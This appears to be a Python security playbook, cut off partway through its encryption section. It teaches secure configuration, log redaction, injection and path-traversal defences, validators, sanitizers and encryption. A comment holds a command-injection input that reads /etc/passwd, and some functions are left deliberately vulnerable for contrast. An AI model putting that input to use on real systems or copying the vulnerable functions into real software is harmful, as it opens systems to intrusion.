# Python for Cybersecurity
## Professional Playbook & Best Practices Guide

**Version:** 2.0  
**Author:** PinkOffense Security 🐰💜  
**Date:** February 2026  
**Python Version:** 3.11+  
**Level:** Intermediate to Advanced

---

## 📋 Table of Contents

1. [Python Security Fundamentals](#1-python-security-fundamentals)
2. [Secure Coding Practices](#2-secure-coding-practices)
3. [Input Validation & Sanitization](#3-input-validation--sanitization)
4. [Cryptography & Hashing](#4-cryptography--hashing)
5. [Network Security Tools](#5-network-security-tools)
6. [Web Security Testing](#6-web-security-testing)
7. [Reconnaissance & OSINT](#7-reconnaissance--osint)
8. [Exploitation Frameworks](#8-exploitation-frameworks)
9. [Malware Analysis](#9-malware-analysis)
10. [Digital Forensics](#10-digital-forensics)
11. [Log Analysis & SIEM](#11-log-analysis--siem)
12. [Automation & Scripting](#12-automation--scripting)
13. [Security Libraries Reference](#13-security-libraries-reference)
14. [Code Templates](#14-code-templates)
15. [Best Practices Checklist](#15-best-practices-checklist)

---

## 1. Python Security Fundamentals

### 1.1 Environment Setup

```bash
# Create isolated virtual environment
python -m venv cybersec_env
source cybersec_env/bin/activate  # Linux/Mac
# cybersec_env\Scripts\activate   # Windows

# Install essential security packages
pip install --upgrade pip
pip install \
    cryptography \
    pycryptodome \
    requests \
    scapy \
    paramiko \
    python-nmap \
    beautifulsoup4 \
    lxml \
    pyyaml \
    python-dotenv \
    bandit \
    safety \
    argon2-cffi
```

### 1.2 Project Structure

```
cybersec_project/
├── .env                    # Environment variables (NEVER commit!)
├── .gitignore              # Git ignore rules
├── requirements.txt        # Dependencies with pinned versions
├── requirements-dev.txt    # Development dependencies
├── setup.py                # Package configuration
├── pyproject.toml          # Modern Python configuration
├── src/
│   ├── __init__.py
│   ├── core/
│   │   ├── __init__.py
│   │   ├── config.py       # Configuration management
│   │   ├── logger.py       # Secure logging
│   │   └── exceptions.py   # Custom exceptions
│   ├── crypto/
│   │   ├── __init__.py
│   │   ├── encryption.py
│   │   └── hashing.py
│   ├── network/
│   │   ├── __init__.py
│   │   ├── scanner.py
│   │   └── sniffer.py
│   └── utils/
│       ├── __init__.py
│       ├── validators.py
│       └── sanitizers.py
├── tests/
│   ├── __init__.py
│   ├── test_crypto.py
│   └── test_network.py
└── docs/
    └── README.md
```

### 1.3 Secure Configuration Management

```python
"""
config.py - Secure Configuration Management
"""
import os
from pathlib import Path
from typing import Optional
from dataclasses import dataclass, field
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()


@dataclass(frozen=True)
class SecurityConfig:
    """Immutable security configuration."""
    
    # API Keys - NEVER hardcode!
    api_key: str = field(default_factory=lambda: os.environ.get("API_KEY", ""))
    secret_key: str = field(default_factory=lambda: os.environ.get("SECRET_KEY", ""))
    
    # Database
    db_host: str = field(default_factory=lambda: os.environ.get("DB_HOST", "localhost"))
    db_port: int = field(default_factory=lambda: int(os.environ.get("DB_PORT", "5432")))
    db_name: str = field(default_factory=lambda: os.environ.get("DB_NAME", ""))
    db_user: str = field(default_factory=lambda: os.environ.get("DB_USER", ""))
    db_password: str = field(default_factory=lambda: os.environ.get("DB_PASSWORD", ""))
    
    # Security Settings
    debug_mode: bool = field(default_factory=lambda: os.environ.get("DEBUG", "false").lower() == "true")
    log_level: str = field(default_factory=lambda: os.environ.get("LOG_LEVEL", "INFO"))
    
    def __post_init__(self):
        """Validate configuration after initialization."""
        if not self.secret_key:
            raise ValueError("SECRET_KEY environment variable is required")
        if len(self.secret_key) < 32:
            raise ValueError("SECRET_KEY must be at least 32 characters")
    
    @property
    def database_url(self) -> str:
        """Construct database URL securely."""
        return f"postgresql://{self.db_user}:{self.db_password}@{self.db_host}:{self.db_port}/{self.db_name}"


# Singleton configuration instance
_config: Optional[SecurityConfig] = None


def get_config() -> SecurityConfig:
    """Get or create configuration singleton."""
    global _config
    if _config is None:
        _config = SecurityConfig()
    return _config
```

### 1.4 Secure Logging

```python
"""
logger.py - Secure Logging Implementation
"""
import logging
import re
import sys
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, Optional
import json


class SensitiveDataFilter(logging.Filter):
    """Filter to redact sensitive information from logs."""
    
    # Patterns to redact
    PATTERNS = [
        (r'password["\']?\s*[:=]\s*["\']?[\w@#$%^&*]+["\']?', 'password=***REDACTED***'),
        (r'api[_-]?key["\']?\s*[:=]\s*["\']?[\w-]+["\']?', 'api_key=***REDACTED***'),
        (r'secret["\']?\s*[:=]\s*["\']?[\w-]+["\']?', 'secret=***REDACTED***'),
        (r'token["\']?\s*[:=]\s*["\']?[\w.-]+["\']?', 'token=***REDACTED***'),
        (r'bearer\s+[\w.-]+', 'Bearer ***REDACTED***'),
        (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', '***EMAIL***'),
        (r'\b\d{3}-\d{2}-\d{4}\b', '***SSN***'),
        (r'\b\d{16}\b', '***CC***'),
    ]
    
    def __init__(self, redact_ips: bool = False):
        super().__init__()
        self.redact_ips = redact_ips
        self._compiled_patterns = [
            (re.compile(pattern, re.IGNORECASE), replacement)
            for pattern, replacement in self.PATTERNS
        ]
    
    def filter(self, record: logging.LogRecord) -> bool:
        """Filter and redact sensitive data from log records."""
        if hasattr(record, 'msg') and isinstance(record.msg, str):
            for pattern, replacement in self._compiled_patterns:
                record.msg = pattern.sub(replacement, record.msg)
        return True


class JSONFormatter(logging.Formatter):
    """JSON formatter for structured logging."""
    
    def format(self, record: logging.LogRecord) -> str:
        log_data = {
            "timestamp": datetime.utcnow().isoformat(),
            "level": record.levelname,
            "logger": record.name,
            "message": record.getMessage(),
            "module": record.module,
            "function": record.funcName,
            "line": record.lineno,
        }
        
        if record.exc_info:
            log_data["exception"] = self.formatException(record.exc_info)
        
        return json.dumps(log_data)


def setup_secure_logger(
    name: str,
    level: int = logging.INFO,
    log_file: Optional[Path] = None,
    json_format: bool = False
) -> logging.Logger:
    """Set up a secure logger with sensitive data filtering."""
    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.handlers.clear()
    
    # Add sensitive data filter
    sensitive_filter = SensitiveDataFilter()
    
    # Console handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(level)
    console_handler.addFilter(sensitive_filter)
    
    if json_format:
        console_handler.setFormatter(JSONFormatter())
    else:
        console_handler.setFormatter(logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(name)s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        ))
    
    logger.addHandler(console_handler)
    
    # File handler (if specified)
    if log_file:
        log_file.parent.mkdir(parents=True, exist_ok=True)
        file_handler = logging.FileHandler(log_file, mode='a', encoding='utf-8')
        file_handler.setLevel(level)
        file_handler.addFilter(sensitive_filter)
        file_handler.setFormatter(JSONFormatter())
        logger.addHandler(file_handler)
    
    return logger
```

---

## 2. Secure Coding Practices

### 2.1 SQL Injection Prevention

```python
"""
SECURE DATABASE OPERATIONS
"""
import sqlite3
from typing import Any, Dict, List, Optional
from contextlib import contextmanager


class SecureDatabase:
    """Secure database wrapper with parameterized queries."""
    
    def __init__(self, db_path: str):
        self.db_path = db_path
    
    @contextmanager
    def get_connection(self):
        """Context manager for database connections."""
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise
        finally:
            conn.close()
    
    # ❌ INSECURE - SQL Injection vulnerable
    def get_user_insecure(self, username: str) -> Optional[Dict]:
        """NEVER DO THIS - Vulnerable to SQL injection."""
        with self.get_connection() as conn:
            # DANGEROUS: String concatenation
            query = f"SELECT * FROM users WHERE username = '{username}'"
            cursor = conn.execute(query)
            return dict(cursor.fetchone()) if cursor.fetchone() else None
    
    # ✅ SECURE - Parameterized query
    def get_user(self, username: str) -> Optional[Dict]:
        """Secure method using parameterized queries."""
        with self.get_connection() as conn:
            query = "SELECT * FROM users WHERE username = ?"
            cursor = conn.execute(query, (username,))
            row = cursor.fetchone()
            return dict(row) if row else None
    
    # ✅ SECURE - Named parameters
    def create_user(self, username: str, email: str, role: str = "user") -> int:
        """Create user with named parameters."""
        with self.get_connection() as conn:
            query = """
                INSERT INTO users (username, email, role, created_at)
                VALUES (:username, :email, :role, datetime('now'))
            """
            cursor = conn.execute(query, {
                "username": username,
                "email": email,
                "role": role
            })
            return cursor.lastrowid
    
    # ✅ SECURE - Whitelist for dynamic columns
    def get_users_sorted(self, sort_column: str, order: str = "ASC") -> List[Dict]:
        """Secure dynamic query with whitelist validation."""
        ALLOWED_COLUMNS = {"username", "email", "created_at", "role"}
        ALLOWED_ORDERS = {"ASC", "DESC"}
        
        if sort_column not in ALLOWED_COLUMNS:
            raise ValueError(f"Invalid sort column: {sort_column}")
        if order.upper() not in ALLOWED_ORDERS:
            raise ValueError(f"Invalid sort order: {order}")
        
        with self.get_connection() as conn:
            query = f"SELECT * FROM users ORDER BY {sort_column} {order.upper()}"
            cursor = conn.execute(query)
            return [dict(row) for row in cursor.fetchall()]
```

### 2.2 Command Injection Prevention

```python
"""
SECURE COMMAND EXECUTION
"""
import subprocess
import shlex
from typing import List, Tuple
from pathlib import Path
import re


class SecureCommandExecutor:
    """Secure wrapper for system command execution."""
    
    # Whitelist of allowed commands
    ALLOWED_COMMANDS = {
        "ping": "/usr/bin/ping",
        "nslookup": "/usr/bin/nslookup",
        "dig": "/usr/bin/dig",
        "whois": "/usr/bin/whois",
        "traceroute": "/usr/bin/traceroute",
    }
    
    # Validation patterns
    IP_PATTERN = re.compile(
        r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}'
        r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    )
    HOSTNAME_PATTERN = re.compile(
        r'^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z0-9-]{1,63})*\.?$'
    )
    
    @classmethod
    def validate_target(cls, target: str) -> bool:
        """Validate target is a valid IP or hostname."""
        return bool(
            cls.IP_PATTERN.match(target) or 
            cls.HOSTNAME_PATTERN.match(target)
        )
    
    # ❌ INSECURE - Command injection vulnerable
    @staticmethod
    def ping_insecure(target: str) -> str:
        """NEVER DO THIS - Vulnerable to command injection."""
        import os
        # DANGEROUS: Direct string concatenation
        # Attack: target = "8.8.8.8; cat /etc/passwd"
        return os.popen(f"ping -c 4 {target}").read()
    
    # ✅ SECURE - Using subprocess with list arguments
    @classmethod
    def ping(cls, target: str, count: int = 4) -> Tuple[bool, str]:
        """Secure ping implementation."""
        # Validate target
        if not cls.validate_target(target):
            raise ValueError(f"Invalid target: {target}")
        
        # Validate count
        if not isinstance(count, int) or count < 1 or count > 10:
            raise ValueError("Count must be between 1 and 10")
        
        try:
            # Using list arguments prevents shell injection
            result = subprocess.run(
                [cls.ALLOWED_COMMANDS["ping"], "-c", str(count), target],
                capture_output=True,
                text=True,
                timeout=30,
                check=False
            )
            return result.returncode == 0, result.stdout
        except subprocess.TimeoutExpired:
            return False, "Command timed out"
        except Exception as e:
            return False, f"Error: {str(e)}"
    
    # ✅ SECURE - Generic command executor
    @classmethod
    def execute(
        cls,
        command: str,
        args: List[str],
        timeout: int = 60
    ) -> Tuple[int, str, str]:
        """Execute a whitelisted command securely."""
        if command not in cls.ALLOWED_COMMANDS:
            raise ValueError(f"Command not allowed: {command}")
        
        # Validate all arguments
        for arg in args:
            if not isinstance(arg, str):
                raise TypeError(f"Argument must be string: {arg}")
            # Block shell metacharacters
            if any(char in arg for char in ';&|`$(){}[]<>\\'):
                raise ValueError(f"Invalid characters in argument: {arg}")
        
        cmd_path = cls.ALLOWED_COMMANDS[command]
        
        try:
            result = subprocess.run(
                [cmd_path] + args,
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False,
                shell=False,
                env={"PATH": "/usr/bin:/bin", "LC_ALL": "C"}
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            raise TimeoutError(f"Command timed out after {timeout}s")
```

### 2.3 Path Traversal Prevention

```python
"""
SECURE FILE OPERATIONS
"""
from pathlib import Path
from typing import Optional, BinaryIO
import os
import hashlib


class SecureFileHandler:
    """Secure file handler with path traversal protection."""
    
    ALLOWED_EXTENSIONS = {'.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif', '.csv'}
    MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB
    
    def __init__(self, base_directory: str):
        self.base_dir = Path(base_directory).resolve()
        if not self.base_dir.exists():
            self.base_dir.mkdir(parents=True, exist_ok=True)
    
    def _validate_path(self, filename: str) -> Path:
        """Validate and resolve file path securely."""
        # Remove null bytes and normalize
        filename = filename.replace('\x00', '')
        
        # Get just the filename, removing any directory components
        safe_filename = Path(filename).name
        
        # Construct full path
        full_path = (self.base_dir / safe_filename).resolve()
        
        # Verify the path is within base directory
        try:
            full_path.relative_to(self.base_dir)
        except ValueError:
            raise PermissionError("Access denied: Path traversal attempt detected")
        
        return full_path
    
    def _validate_extension(self, filename: str) -> bool:
        """Validate file extension against whitelist."""
        ext = Path(filename).suffix.lower()
        return ext in self.ALLOWED_EXTENSIONS
    
    # ❌ INSECURE - Path traversal vulnerable
    def read_file_insecure(self, filename: str) -> str:
        """NEVER DO THIS - Vulnerable to path traversal."""
        with open(filename, 'r') as f:
            return f.read()
    
    # ✅ SECURE - With path validation
    def read_file(self, filename: str) -> str:
        """Securely read a file."""
        safe_path = self._validate_path(filename)
        
        if not safe_path.exists():
            raise FileNotFoundError(f"File not found: {filename}")
        
        if not safe_path.is_file():
            raise IsADirectoryError(f"Not a file: {filename}")
        
        if safe_path.stat().st_size > self.MAX_FILE_SIZE:
            raise ValueError(f"File too large: {filename}")
        
        with open(safe_path, 'r', encoding='utf-8') as f:
            return f.read()
    
    # ✅ SECURE - File upload with validation
    def save_uploaded_file(
        self,
        file_data: BinaryIO,
        original_filename: str
    ) -> dict:
        """Securely save an uploaded file."""
        if not self._validate_extension(original_filename):
            raise ValueError(f"File type not allowed: {original_filename}")
        
        safe_name = Path(original_filename).name
        ext = Path(safe_name).suffix.lower()
        
        content = file_data.read(self.MAX_FILE_SIZE + 1)
        if len(content) > self.MAX_FILE_SIZE:
            raise ValueError("File too large")
        
        file_hash = hashlib.sha256(content).hexdigest()[:16]
        new_filename = f"{file_hash}{ext}"
        
        safe_path = self._validate_path(new_filename)
        with open(safe_path, 'wb') as f:
            f.write(content)
        
        return {
            "original_name": original_filename,
            "saved_name": new_filename,
            "size": len(content),
            "hash": file_hash,
            "path": str(safe_path)
        }
```

### 2.4 Secure Deserialization

```python
"""
SECURE DESERIALIZATION
"""
import json
import yaml
from typing import Any, Dict, Type, TypeVar
from dataclasses import dataclass
import hmac
import hashlib


T = TypeVar('T')


class SecureSerializer:
    """Secure serialization with integrity verification."""
    
    def __init__(self, secret_key: bytes):
        if len(secret_key) < 32:
            raise ValueError("Secret key must be at least 32 bytes")
        self.secret_key = secret_key
    
    def _sign(self, data: bytes) -> bytes:
        """Generate HMAC signature for data."""
        return hmac.new(self.secret_key, data, hashlib.sha256).digest()
    
    def _verify(self, data: bytes, signature: bytes) -> bool:
        """Verify HMAC signature."""
        expected = self._sign(data)
        return hmac.compare_digest(expected, signature)
    
    # ❌ NEVER use pickle.loads() with untrusted data - RCE vulnerability!
    
    # ✅ SECURE - JSON with signature verification
    def serialize_json(self, obj: Dict[str, Any]) -> bytes:
        """Serialize object to signed JSON."""
        data = json.dumps(obj, sort_keys=True, separators=(',', ':')).encode()
        signature = self._sign(data)
        return signature + data
    
    def deserialize_json(self, signed_data: bytes) -> Dict[str, Any]:
        """Deserialize signed JSON with verification."""
        if len(signed_data) < 32:
            raise ValueError("Invalid signed data")
        
        signature = signed_data[:32]
        data = signed_data[32:]
        
        if not self._verify(data, signature):
            raise ValueError("Invalid signature - data may be tampered")
        
        return json.loads(data.decode())
    
    # ✅ SECURE - YAML with safe loader
    @staticmethod
    def load_yaml_safe(yaml_string: str) -> Any:
        """Safely load YAML without code execution."""
        # ❌ NEVER use yaml.load() or yaml.unsafe_load()
        # ✅ Always use yaml.safe_load()
        return yaml.safe_load(yaml_string)
    
    # ✅ SECURE - Type-safe deserialization
    @staticmethod
    def deserialize_to_dataclass(
        data: Dict[str, Any],
        target_class: Type[T]
    ) -> T:
        """Deserialize dictionary to a dataclass with type checking."""
        if not hasattr(target_class, '__dataclass_fields__'):
            raise TypeError(f"{target_class} is not a dataclass")
        
        allowed_fields = target_class.__dataclass_fields__.keys()
        filtered_data = {
            k: v for k, v in data.items()
            if k in allowed_fields
        }
        
        return target_class(**filtered_data)
```

---

## 3. Input Validation & Sanitization

### 3.1 Comprehensive Validators

```python
"""
validators.py - Input Validation Module
"""
import re
from typing import Any, Callable, List, Optional, Union
from dataclasses import dataclass, field
from functools import wraps
import ipaddress


class ValidationError(Exception):
    """Custom validation error with field information."""
    
    def __init__(self, field: str, message: str, value: Any = None):
        self.field = field
        self.message = message
        self.value = value
        super().__init__(f"{field}: {message}")


@dataclass
class ValidationResult:
    """Result of validation operation."""
    is_valid: bool
    errors: List[ValidationError] = field(default_factory=list)
    sanitized_value: Any = None


class Validators:
    """Collection of secure input validators."""
    
    # Compiled regex patterns for performance
    PATTERNS = {
        'email': re.compile(
            r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        ),
        'username': re.compile(
            r'^[a-zA-Z][a-zA-Z0-9_-]{2,31}$'
        ),
        'uuid': re.compile(
            r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$',
            re.IGNORECASE
        ),
        'hostname': re.compile(
            r'^(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\.[A-Za-z0-9-]{1,63})*$'
        ),
        'alphanumeric': re.compile(r'^[a-zA-Z0-9]+$'),
        'slug': re.compile(r'^[a-z0-9]+(?:-[a-z0-9]+)*$'),
    }
    
    @classmethod
    def validate_string(
        cls,
        value: Any,
        min_length: int = 0,
        max_length: int = 1000,
        pattern: Optional[str] = None,
        strip: bool = True
    ) -> str:
        """Validate and sanitize string input."""
        if not isinstance(value, str):
            raise ValidationError("string", f"Expected string, got {type(value).__name__}", value)
        
        if strip:
            value = value.strip()
        
        # Remove null bytes
        value = value.replace('\x00', '')
        
        if len(value) < min_length:
            raise ValidationError("string", f"Must be at least {min_length} characters", value)
        if len(value) > max_length:
            raise ValidationError("string", f"Must be at most {max_length} characters", value)
        
        if pattern and pattern in cls.PATTERNS:
            if not cls.PATTERNS[pattern].match(value):
                raise ValidationError("string", f"Does not match {pattern} pattern", value)
        
        return value
    
    @classmethod
    def validate_email(cls, value: str) -> str:
        """Validate email address."""
        value = cls.validate_string(value, min_length=5, max_length=254)
        value = value.lower()
        
        if not cls.PATTERNS['email'].match(value):
            raise ValidationError("email", "Invalid email format", value)
        
        local, domain = value.rsplit('@', 1)
        if len(local) > 64:
            raise ValidationError("email", "Local part too long", value)
        
        return value
    
    @classmethod
    def validate_username(cls, value: str) -> str:
        """Validate username."""
        value = cls.validate_string(value, min_length=3, max_length=32)
        value = value.lower()
        
        if not cls.PATTERNS['username'].match(value):
            raise ValidationError(
                "username",
                "Username must start with letter, contain only letters, numbers, underscores, hyphens",
                value
            )
        
        RESERVED = {'admin', 'root', 'system', 'administrator', 'null', 'undefined'}
        if value in RESERVED:
            raise ValidationError("username", "Username is reserved", value)
        
        return value
    
    @classmethod
    def validate_password(
        cls,
        value: str,
        min_length: int = 12,
        require_uppercase: bool = True,
        require_lowercase: bool = True,
        require_digit: bool = True,
        require_special: bool = True
    ) -> str:
        """Validate password strength."""
        if not isinstance(value, str):
            raise ValidationError("password", "Invalid password type")
        
        errors = []
        
        if len(value) < min_length:
            errors.append(f"Must be at least {min_length} characters")
        if len(value) > 128:
            errors.append("Must be at most 128 characters")
        if require_uppercase and not re.search(r'[A-Z]', value):
            errors.append("Must contain uppercase letter")
        if require_lowercase and not re.search(r'[a-z]', value):
            errors.append("Must contain lowercase letter")
        if require_digit and not re.search(r'\d', value):
            errors.append("Must contain digit")
        if require_special and not re.search(r'[!@#$%^&*(),.?":{}|<>]', value):
            errors.append("Must contain special character")
        
        # Check for common patterns
        COMMON_PATTERNS = [
            r'(.)\1{2,}',  # Repeated characters
            r'(012|123|234|345|456|567|678|789|890)',
            r'(abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop)',
        ]
        for pattern in COMMON_PATTERNS:
            if re.search(pattern, value.lower()):
                errors.append("Contains easily guessable pattern")
                break
        
        if errors:
            raise ValidationError("password", "; ".join(errors))
        
        return value
    
    @classmethod
    def validate_ip_address(cls, value: str, version: Optional[int] = None) -> str:
        """Validate IP address."""
        value = cls.validate_string(value, max_length=45)
        
        try:
            ip = ipaddress.ip_address(value)
            
            if version == 4 and not isinstance(ip, ipaddress.IPv4Address):
                raise ValidationError("ip", "Expected IPv4 address", value)
            if version == 6 and not isinstance(ip, ipaddress.IPv6Address):
                raise ValidationError("ip", "Expected IPv6 address", value)
            
            return str(ip)
        except ValueError:
            raise ValidationError("ip", "Invalid IP address format", value)
    
    @classmethod
    def validate_port(cls, value: Union[int, str]) -> int:
        """Validate port number."""
        try:
            port = int(value)
        except (ValueError, TypeError):
            raise ValidationError("port", "Must be a valid integer", value)
        
        if not 1 <= port <= 65535:
            raise ValidationError("port", "Must be between 1 and 65535", value)
        
        return port
    
    @classmethod
    def validate_url(cls, value: str, allowed_schemes: List[str] = None) -> str:
        """Validate URL."""
        from urllib.parse import urlparse
        
        value = cls.validate_string(value, max_length=2048)
        
        if allowed_schemes is None:
            allowed_schemes = ['http', 'https']
        
        try:
            parsed = urlparse(value)
            
            if parsed.scheme not in allowed_schemes:
                raise ValidationError("url", f"Scheme must be one of: {allowed_schemes}", value)
            
            if not parsed.netloc:
                raise ValidationError("url", "Missing hostname", value)
            
            hostname = parsed.hostname
            if hostname:
                try:
                    ip = ipaddress.ip_address(hostname)
                    if ip.is_private or ip.is_loopback:
                        raise ValidationError("url", "Private/localhost URLs not allowed", value)
                except ValueError:
                    if hostname in ('localhost', '127.0.0.1', '0.0.0.0'):
                        raise ValidationError("url", "Localhost not allowed", value)
            
            return value
        except ValidationError:
            raise
        except Exception:
            raise ValidationError("url", "Invalid URL format", value)


# Decorator for automatic validation
def validate_params(**validators):
    """Decorator to automatically validate function parameters."""
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        def wrapper(*args, **kwargs):
            for param_name, validator in validators.items():
                if param_name in kwargs:
                    kwargs[param_name] = validator(kwargs[param_name])
            return func(*args, **kwargs)
        return wrapper
    return decorator
```

### 3.2 HTML/XSS Sanitization

```python
"""
sanitizers.py - Output Encoding & Sanitization
"""
import html
import re
from typing import Optional, Set
from urllib.parse import quote


class Sanitizers:
    """Collection of output sanitization methods."""
    
    ALLOWED_TAGS = {
        'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3',
        'ul', 'ol', 'li', 'a', 'blockquote', 'code', 'pre'
    }
    
    @staticmethod
    def html_escape(value: str) -> str:
        """Escape HTML special characters."""
        return html.escape(value, quote=True)
    
    @staticmethod
    def html_attribute_escape(value: str) -> str:
        """Escape for use in HTML attributes."""
        value = html.escape(value, quote=True)
        value = value.replace('`', '&#96;')
        value = value.replace('=', '&#61;')
        return value
    
    @staticmethod
    def javascript_escape(value: str) -> str:
        """Escape for use in JavaScript strings."""
        escapes = {
            '\\': '\\\\',
            "'": "\\'",
            '"': '\\"',
            '\n': '\\n',
            '\r': '\\r',
            '\t': '\\t',
            '<': '\\x3c',
            '>': '\\x3e',
            '&': '\\x26',
        }
        for char, escape in escapes.items():
            value = value.replace(char, escape)
        return value
    
    @staticmethod
    def url_encode(value: str) -> str:
        """URL-encode a string."""
        return quote(value, safe='')
    
    @classmethod
    def strip_tags(cls, html_content: str) -> str:
        """Remove all HTML tags from content."""
        html_content = re.sub(
            r'<(script|style)[^>]*>.*?</\1>',
            '',
            html_content,
            flags=re.DOTALL | re.IGNORECASE
        )
        text = re.sub(r'<[^>]+>', '', html_content)
        text = html.unescape(text)
        return text.strip()
    
    @classmethod
    def sanitize_html(
        cls,
        html_content: str,
        allowed_tags: Optional[Set[str]] = None,
        strip_unknown: bool = True
    ) -> str:
        """Sanitize HTML content allowing only safe tags."""
        if allowed_tags is None:
            allowed_tags = cls.ALLOWED_TAGS
        
        def replace_tag(match):
            full_tag = match.group(0)
            tag_name = match.group(1).lower()
            is_closing = full_tag.startswith('</')
            
            if tag_name in allowed_tags:
                if is_closing:
                    return f'</{tag_name}>'
                else:
                    return f'<{tag_name}>'
            else:
                if strip_unknown:
                    return ''
                else:
                    return html.escape(full_tag)
        
        result = re.sub(r'</?([a-zA-Z][a-zA-Z0-9]*)[^>]*>', replace_tag, html_content)
        return result


def safe_like_pattern(user_input: str) -> str:
    """Escape special characters for SQL LIKE patterns."""
    user_input = user_input.replace('\\', '\\\\')
    user_input = user_input.replace('%', '\\%')
    user_input = user_input.replace('_', '\\_')
    return user_input
```

---

## 4. Cryptography & Hashing

### 4.1 Secure Encryption

```python
"""
encryption.py - Secure Encryption Module
"""
import os
import base64
from typing import Tuple
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet
import secrets


class SecureEncryption:
    """
    Secure encryption utilities using modern algorithms.
    
    Supports:
    - AES-256-GCM (recommended for most uses)
    - ChaCha20-Poly1305 (good for mobile/constrained environments)
    - Fernet (simpler API, good for basic needs)
    """
    
    AES_KEY_SIZE = 32  # 256 bits
    NONCE_SIZE = 12    # 96 bits for GCM
    SALT_SIZE = 16     # 128 bits
    
    @staticmethod
    def generate_key() -> bytes:
        """Generate a cryptographically secure random key."""
        return secrets.token_bytes(SecureEncryption.AES_KEY_SIZE)
    
    @staticmethod
    def generate_nonce() -> bytes:
        """Generate a random nonce for encryption."""
        return secrets.token_bytes(SecureEncryption.NONCE_SIZE)
    
    @staticmethod
    def derive_key_from_password(
        password: str,
        salt: bytes = None,
        iterations: int = 600000
    ) -> Tuple[bytes, bytes]:
        """Derive encryption key from password using PBKDF2."""
        if salt is None:
            salt = secrets.token_bytes(SecureEncryption.SALT_SIZE)
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=SecureEncryption.AES_KEY_SIZE,
            salt=salt,
            iterations=iterations,
            backend=default_backend()
        )
        
        key = kdf.derive(password.encode())
        return key, salt
    
    @staticmethod
    def derive_key_scrypt(
        password: str,
        salt: bytes = None,
        n: int = 2**17,
        r: int = 8,
        p: int = 1
    ) -> Tuple[bytes, bytes]:
        """Derive key using Scrypt (more resistant to hardware attacks)."""
        if salt is None:
            salt = secrets.token_bytes(SecureEncryption.SALT_SIZE)
        
        kdf = Scrypt(
            salt=salt,
            length=SecureEncryption.AES_KEY_SIZE,
            n=n,
            r=r,
            p=p,
            backend=default_backend()
        )
        
        key = kdf.derive(password.encode())
        return key, salt
    
    # AES-256-GCM Encryption
    @staticmethod
    def encrypt_aes_gcm(
        plaintext: bytes,
        key: bytes,
        associated_data: bytes = None
    ) -> bytes:
        """Encrypt using AES-256-GCM (authenticated encryption)."""
        if len(key) != SecureEncryption.AES_KEY_SIZE:
            raise ValueError(f"Key must be {SecureEncryption.AES_KEY_SIZE} bytes")
        
        nonce = SecureEncryption.generate_nonce()
        aesgcm = AESGCM(key)
        ciphertext = aesgcm.encrypt(nonce, plaintext, associated_data)
        
        return nonce + ciphertext
    
    @staticmethod
    def decrypt_aes_gcm(
        ciphertext: bytes,
        key: bytes,
        associated_data: bytes = None
    ) -> bytes:
        """Decrypt AES-256-GCM encrypted data."""
        if len(key) != SecureEncryption.AES_KEY_SIZE:
            raise ValueError(f"Key must be {SecureEncryption.AES_KEY_SIZE} bytes")
        
        if len(ciphertext) < SecureEncryption.NONCE_SIZE:
            raise ValueError("Ciphertext too short")
        
        nonce = ciphertext[:SecureEncryption.NONCE_SIZE]
        actual_ciphertext = ciphertext[SecureEncryption.NONCE_SIZE:]
        
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, actual_ciphertext, associated_data)
    
    # ChaCha20-Poly1305 Encryption
    @staticmethod
    def encrypt_chacha20(
        plaintext: bytes,
        key: bytes,
        associated_data: bytes = None
    ) -> bytes:
        """Encrypt using ChaCha20-Poly1305."""
        nonce = SecureEncryption.generate_nonce()
        chacha = ChaCha20Poly1305(key)
        ciphertext = chacha.encrypt(nonce, plaintext, associated_data)
        return nonce + ciphertext
    
    @staticmethod
    def decrypt_chacha20(
        ciphertext: bytes,
        key: bytes,
        associated_data: bytes = None
    ) -> bytes:
        """Decrypt ChaCha20-Poly1305 encrypted data."""
        nonce = ciphertext[:SecureEncryption.NONCE_SIZE]
        actual_ciphertext = ciphertext[SecureEncryption.NONCE_SIZE:]
        
        chacha = ChaCha20Poly1305(key)
        return chacha.decrypt(nonce, actual_ciphertext, associated_data)


class PasswordEncryptor:
    """High-level interface for password-based encryption."""
    
    VERSION = b'\x01'
    
    @classmethod
    def encrypt(cls, plaintext: bytes, password: str) -> bytes:
        """Encrypt data with a password."""
        key, salt = SecureEncryption.derive_key_from_password(password)
        
        nonce = SecureEncryption.generate_nonce()
        aesgcm = AESGCM(key)
        ciphertext = aesgcm.encrypt(nonce, plaintext, None)
        
        return cls.VERSION + salt + nonce + ciphertext
    
    @classmethod
    def decrypt(cls, encrypted: bytes, password: str) -> bytes:
        """Decrypt password-encrypted data."""
        if len(encrypted) < 1 + 16 + 12:
            raise ValueError("Invalid encrypted data")
